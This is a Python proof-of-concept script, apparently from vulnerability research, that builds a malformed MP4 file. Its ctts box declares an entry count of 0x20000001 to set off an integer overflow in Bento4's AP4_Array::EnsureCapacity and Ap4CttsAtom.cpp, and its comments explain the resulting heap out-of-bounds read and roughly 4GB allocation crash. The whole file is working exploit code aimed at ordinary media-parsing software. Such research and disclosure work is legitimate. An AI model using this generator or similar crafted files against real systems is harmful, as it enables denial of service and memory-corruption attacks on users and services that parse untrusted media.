#!/usr/bin/env python3
"""
VULN-001 PoC Generator: Integer Overflow in AP4_Array::EnsureCapacity
Constructs a minimal MP4 with a ctts box having entry_count=0x20000001
to trigger a ~4GB allocation attempt on 64-bit (bad_alloc -> crash/DoS).
"""

import struct
import os

OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.mp4")

def box(type_str, payload=b""):
    """Build a box: 4-byte size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, type_str.encode()) + payload

def fullbox(type_str, version, flags, payload=b""):
    """Build a FullBox: box header + version(1B) + flags(3B) + payload."""
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(type_str, fb_payload)

# --- ftyp ---
ftyp_payload = (
    b"isom"          # major_brand
    + struct.pack(">I", 0)  # minor_version
    + b"isom"        # compatible_brands[0]
)
ftyp = box("ftyp", ftyp_payload)

# --- mvhd (version 0, 108 bytes total) ---
identity_matrix = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
mvhd_payload = (
    struct.pack(">II", 0, 0)     # creation_time, modification_time
    + struct.pack(">I", 1000)    # timescale
    + struct.pack(">I", 0)       # duration
    + struct.pack(">I", 0x00010000)  # rate
    + struct.pack(">H", 0x0100)  # volume
    + b"\x00" * 10               # reserved
    + identity_matrix            # matrix (36 bytes)
    + b"\x00" * 24               # pre_defined
    + struct.pack(">I", 2)       # next_track_id
)
mvhd = fullbox("mvhd", 0, 0, mvhd_payload)

# --- tkhd (version 0, 92 bytes total) ---
tkhd_payload = (
    struct.pack(">II", 0, 0)     # creation_time, modification_time
    + struct.pack(">I", 1)       # track_id
    + b"\x00" * 4               # reserved
    + struct.pack(">I", 0)       # duration
    + b"\x00" * 8               # reserved
    + struct.pack(">hh", 0, 0)  # layer, alternate_group
    + struct.pack(">H", 0)       # volume
    + b"\x00" * 2               # reserved
    + identity_matrix            # matrix (36 bytes)
    + struct.pack(">II", 0, 0)  # width, height (fixed-point 16.16)
)
tkhd = fullbox("tkhd", 0, 3, tkhd_payload)

# --- mdhd (version 0, 32 bytes total) ---
mdhd_payload = (
    struct.pack(">II", 0, 0)     # creation_time, modification_time
    + struct.pack(">I", 44100)   # timescale
    + struct.pack(">I", 0)       # duration
    + struct.pack(">H", 0x55c4) # language = 'und'
    + struct.pack(">H", 0)       # pre_defined
)
mdhd = fullbox("mdhd", 0, 0, mdhd_payload)

# --- hdlr ---
hdlr_payload = (
    struct.pack(">I", 0)         # pre_defined
    + b"soun"                    # handler_type
    + b"\x00" * 12              # reserved
    + b"\x00"                    # name (null-terminated)
)
hdlr = fullbox("hdlr", 0, 0, hdlr_payload)

# --- smhd ---
smhd_payload = struct.pack(">HH", 0, 0)  # balance, reserved
smhd = fullbox("smhd", 0, 0, smhd_payload)

# --- dref + dinf ---
url_payload = b""  # flags=1 means self-contained, no URL string needed
url_box = fullbox("url ", 0, 1, url_payload)
dref_payload = struct.pack(">I", 1) + url_box  # entry_count=1
dref = fullbox("dref", 0, 0, dref_payload)
dinf = box("dinf", dref)

# --- stbl children ---
stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))   # entry_count=0
stts = fullbox("stts", 0, 0, struct.pack(">I", 0))   # entry_count=0
stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))   # entry_count=0
stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))  # sample_size=0, sample_count=0
stco = fullbox("stco", 0, 0, struct.pack(">I", 0))   # entry_count=0

# --- ctts (THE TRIGGER) ---
# entry_count = 0x20000001
#
# Two-stage vulnerability:
# 1. EnsureCapacity(0x20000001): ::operator new(0x20000001 * sizeof(T))
#    where sizeof(T)=8 is size_t → 64-bit arithmetic → 0x100000008 (~4GB).
#    On Linux overcommit this allocation succeeds (virtual memory), then
#    0x20000001 default constructors write zeros to 4GB.
#
# 2. HEAP BUFFER OVERFLOW (caught by ASAN):
#    Line 80 in Ap4CttsAtom.cpp:
#      new unsigned char[entry_count*8]
#    where entry_count is AP4_UI32 (uint32_t). Multiplication is 32-bit:
#      0x20000001 * 8 mod 2^32 = 0x8 = 8  → only 8 bytes allocated!
#    Line 81: stream.Read(buffer, entry_count*8) = stream.Read(buffer, 8)
#    → reads 8 bytes (1 real entry we embedded) → succeeds.
#    Loop at line 88: i=0 reads buffer[0..7] (OK), i=1 reads buffer[8..15]
#    → OUT-OF-BOUNDS read on 8-byte heap buffer → ASAN heap-buffer-overflow!
#
# We include 1 real ctts entry (8 bytes) so stream.Read succeeds and the
# loop actually runs (and crashes at i=1).
TRIGGER_ENTRY_COUNT = 0x20000001
# 1 real entry: sample_count=1, sample_offset=0 (8 bytes)
ctts_entries = struct.pack(">II", 1, 0)
ctts_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT) + ctts_entries
ctts = fullbox("ctts", 0, 0, ctts_payload)

# --- stbl ---
stbl_content = stsd + stts + stsc + stsz + stco + ctts
stbl = box("stbl", stbl_content)

# --- minf ---
minf_content = smhd + dinf + stbl
minf = box("minf", minf_content)

# --- mdia ---
mdia_content = mdhd + hdlr + minf
mdia = box("mdia", mdia_content)

# --- trak ---
trak_content = tkhd + mdia
trak = box("trak", trak_content)

# --- moov ---
moov_content = mvhd + trak
moov = box("moov", moov_content)

# --- Final MP4 ---
mp4_data = ftyp + moov

with open(OUTFILE, "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"ctts entry_count = 0x{TRIGGER_ENTRY_COUNT:08X} ({TRIGGER_ENTRY_COUNT})")
print(f"Expected allocation on 64-bit: 0x{TRIGGER_ENTRY_COUNT * 8:016X} bytes (~{TRIGGER_ENTRY_COUNT * 8 / (1024**3):.1f} GB)")
